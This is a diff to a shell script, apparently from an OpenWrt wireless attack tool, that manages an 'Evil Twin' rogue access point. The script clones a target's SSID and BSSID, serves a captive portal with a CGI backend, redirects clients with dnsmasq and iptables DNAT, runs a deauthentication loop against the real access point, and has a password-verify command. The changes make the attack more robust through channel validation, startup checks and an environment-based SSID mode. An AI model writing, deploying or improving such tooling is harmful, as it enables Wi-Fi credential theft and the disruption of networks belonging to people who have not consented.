@@ -1,6 +1,7 @@
 #!/bin/sh
 # arx-et.sh — Evil Twin AP manager
 # Usage: arx-et.sh start <ssid> <bssid> <channel> <iface> <ap_iface>
+#        arx-et.sh start_env <bssid> <channel> <iface> <ap_iface>   (SSID from ARX_ET_SSID or start_ssid.txt)
 #        arx-et.sh stop
 #        arx-et.sh verify <ssid> <bssid> <password>
 
@@ -35,15 +36,38 @@ _kill_pid_file() {
 	rm -f "$f"
 }
 
-# Pick hostapd hw_mode from channel (2.4 vs 5 GHz)
-_hw_mode_for_channel() {
+# 2.4 GHz: 1–14 → hw_mode g；5 GHz 常见 ≥32 → a；其余非法值回退信道 6 + g（避免误用 5 GHz）
+_normalize_wifi_channel() {
 	local ch="$1"
 	[ -z "$ch" ] && ch=6
-	case "$ch" in *[!0-9]*) ch=6 ;; esac
+	case "$ch" in *[!0-9]*)
+		_log "invalid channel (non-numeric): $1, using 6"
+		echo 6
+		return
+		;;
+	esac
+	[ "$ch" -eq 0 ] && ch=6
+	if [ "$ch" -ge 1 ] && [ "$ch" -le 14 ]; then
+		echo "$ch"
+		return
+	fi
+	if [ "$ch" -ge 32 ]; then
+		echo "$ch"
+		return
+	fi
+	_log "invalid channel $ch (use 1-14 for 2.4GHz or >=32 for 5GHz), using 6"
+	echo 6
+}
+
+_hw_mode_for_channel() {
+	local ch="$1"
+	case "$ch" in *[!0-9]*) echo g; return ;; esac
 	if [ "$ch" -ge 1 ] && [ "$ch" -le 14 ]; then
 		echo g
-	else
+	elif [ "$ch" -ge 32 ]; then
 		echo a
+	else
+		echo g
 	fi
 }
 
@@ -214,7 +238,16 @@ WRAPPER
 	# With -h PORTAL_DIR, /cgi-bin/* maps to $PORTAL_DIR/cgi-bin/* and executes as CGI.
 	busybox httpd -p 80 -h "$PORTAL_DIR" &
 	echo $! > "$HTTPD_PID"
-	_log "httpd started pid=$(cat $HTTPD_PID) docroot=$PORTAL_DIR (no -c; cgi-bin under docroot)"
+	sleep 1
+	hp=""
+	[ -f "$HTTPD_PID" ] && hp=$(cat "$HTTPD_PID" 2>/dev/null)
+	if [ -z "$hp" ] || ! kill -0 "$hp" 2>/dev/null; then
+		rm -f "$HTTPD_PID"
+		_log "httpd failed to bind or exited immediately (port 80 in use?)"
+		return 1
+	fi
+	_log "httpd started pid=$hp docroot=$PORTAL_DIR (no -c; cgi-bin under docroot)"
+	return 0
 }
 
 _start_dnsmasq() {
@@ -237,7 +270,10 @@ no-hosts
 pid-file=$DNSMASQ_PID
 DNSEOF
 
-	dnsmasq -C "$DNSMASQ_CONF"
+	if ! dnsmasq -C "$DNSMASQ_CONF"; then
+		_log "dnsmasq failed to start (see system log / config: $DNSMASQ_CONF)"
+		return 1
+	fi
 	_log "dnsmasq started"
 
 	iptables -t nat -A PREROUTING -i "$ap_iface" -p tcp --dport 80 -j DNAT --to-destination "$GW_IP:80" 2>/dev/null
@@ -328,14 +364,19 @@ _start_deauth() {
 	_log "deauth loop pid=$(cat $DEAUTH_PID) target=$bssid burst=$burst interval=${interval}s"
 }
 
-case "$cmd" in
-start)
-	ssid="$2"; bssid="$3"; channel="$4"; iface="$5"; ap_iface="$6"
+# Args: ssid bssid channel iface ap_iface
+_do_evil_twin_start() {
+	ssid="$1"
+	bssid="$2"
+	channel="$3"
+	iface="$4"
+	ap_iface="$5"
 	[ -z "$ssid" ] || [ -z "$bssid" ] || [ -z "$iface" ] && { echo "missing args"; exit 1; }
 	[ -z "$channel" ] && channel=6
 	[ -z "$ap_iface" ] && ap_iface="${iface}ap"
 
 	mkdir -p "$ET_DIR"
+	channel=$(_normalize_wifi_channel "$channel")
 	if [ -f "$ET_DIR/hostapd.pid" ]; then
 		hp=$(cat "$ET_DIR/hostapd.pid" 2>/dev/null)
 		if [ -n "$hp" ] && ! kill -0 "$hp" 2>/dev/null; then
@@ -375,8 +416,12 @@ start)
 
 	_write_portal "$ssid" "$bssid"
 	_start_hostapd "$ssid" "$channel" "$ap_iface"
-	_start_dnsmasq "$ap_iface"
-	_start_httpd
+	if ! _start_dnsmasq "$ap_iface"; then
+		_log "dnsmasq did not start; captive DNS/DHCP may be unavailable"
+	fi
+	if ! _start_httpd; then
+		_log "httpd did not start; captive portal POST may be unavailable"
+	fi
 	_start_deauth "$bssid" "$mon_iface"
 
 	echo "running" > "$STATUS_FILE"
@@ -389,6 +434,20 @@ start)
 		echo $! > "$RUNTIME_WATCH_PID"
 		_log "runtime watchdog pid=$(cat $RUNTIME_WATCH_PID) seconds=$mr"
 	fi
+}
+
+case "$cmd" in
+start)
+	_do_evil_twin_start "$2" "$3" "$4" "$5" "$6"
+	;;
+
+start_env)
+	mkdir -p "$ET_DIR"
+	# SSID 由 LuCI 白名单过滤后写入 start_ssid.txt；下游一律使用 "$ssid" 引用
+	ssid="${ARX_ET_SSID:-}"
+	[ -z "$ssid" ] && [ -f "$ET_DIR/start_ssid.txt" ] && ssid=$(cat "$ET_DIR/start_ssid.txt" 2>/dev/null || true)
+	[ -z "$ssid" ] && { logger -t arx-et "start_env: missing SSID (ARX_ET_SSID / start_ssid.txt)"; exit 1; }
+	_do_evil_twin_start "$ssid" "$2" "$3" "$4" "$5"
 	;;
 
 stop)
